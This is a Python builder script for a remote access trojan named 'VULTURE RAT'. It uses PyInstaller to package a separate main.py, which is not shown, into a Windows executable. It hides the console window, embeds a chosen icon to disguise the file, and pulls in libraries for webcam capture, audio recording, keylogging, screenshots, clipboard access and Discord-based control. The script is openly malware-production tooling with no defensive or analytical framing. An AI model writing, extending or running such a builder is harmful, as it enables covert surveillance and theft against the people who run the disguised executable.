import subprocess
import os
import sys

print("=" * 60)
print("VULTURE RAT BUILDER v5.0 - Python Edition")
print("Full Feature (CV2 + PyAudio + Icon Support)")
print("=" * 60)

if not os.path.exists("main.py"):
    print("[X] main.py not found!")
    sys.exit(1)

# Get options
output_name = input("Output name [VultureRAT]: ").strip()
if not output_name:
    output_name = "VultureRAT"

# Icon file
icon_file = ""
if os.path.exists("icon.ico"):
    use_icon = input("Found icon.ico. Use it? (y/n) [y]: ").strip().lower()
    if use_icon != 'n':
        icon_file = "icon.ico"
        print("[YES] Using icon.ico")
else:
    custom_icon = input("Drag .ico file here (or press ENTER to skip): ").strip()
    if custom_icon:
        custom_icon = custom_icon.strip('"')
        if os.path.exists(custom_icon) and custom_icon.lower().endswith('.ico'):
            icon_file = custom_icon
            print(f"[YES] Using icon: {icon_file}")
        else:
            print("[NO] Invalid icon file - skipping")

console = input("Console window? (y/n) [n]: ").lower()
console_flag = [] if console == 'y' else ['--noconsole']

bundle = input("One-file or one-dir? (1=onefile/2=onedir) [1]: ").strip()
if bundle == "2":
    bundle_flag = ['--onedir']
    print("Mode: One-dir (better for CV2/PyAudio)")
else:
    bundle_flag = ['--onefile']
    print("Mode: Single EXE")

print("\n[*] Installing requirements...")
subprocess.run([sys.executable, "-m", "pip", "install", "pyinstaller", "opencv-python", "pyaudio", "discord.py", "psutil", "requests", "pillow", "pyautogui", "pynput", "pyperclip", "cryptography", "pywin32", "numpy", "--quiet"])

print("[*] Building...")

# Build command
cmd = [
    sys.executable, "-m", "PyInstaller",
    *bundle_flag,
    *console_flag,
    f"--name={output_name}",
    "--hidden-import=http",
    "--hidden-import=http.client",
    "--hidden-import=http.cookies",
    "--hidden-import=http.cookiejar",
    "--hidden-import=aiohttp",
    "--hidden-import=aiohttp.http",
    "--hidden-import=cv2",
    "--hidden-import=pyaudio",
    "--hidden-import=keyboard",
    "--hidden-import=numpy",
    "--collect-all=win32com",
    "--collect-all=Crypto",
    "--collect-all=cv2",
    "--collect-all=numpy",
    "--exclude-module=tkinter",
    "--exclude-module=unittest",
    "--exclude-module=test",
]

# Add icon if provided
if icon_file:
    cmd.append(f"--icon={icon_file}")

# Add source file
cmd.append("main.py")

print(f"[DEBUG] {' '.join(cmd)}\n")
result = subprocess.run(cmd)

# Check result
if os.path.exists(f"dist/{output_name}.exe"):
    size = os.path.getsize(f"dist/{output_name}.exe") / (1024*1024)
    print(f"\n[+] SUCCESS! Size: {size:.1f} MB")
    print(f"[+] File: dist/{output_name}.exe")
    if icon_file:
        print(f"[+] Icon embedded: {icon_file}")
elif os.path.exists(f"dist/{output_name}/{output_name}.exe"):
    print(f"\n[+] SUCCESS! File: dist/{output_name}/{output_name}.exe")
    if icon_file:
        print(f"[+] Icon embedded: {icon_file}")
else:
    print("\n[-] Build failed - check errors above")

input("\nPress Enter to exit...")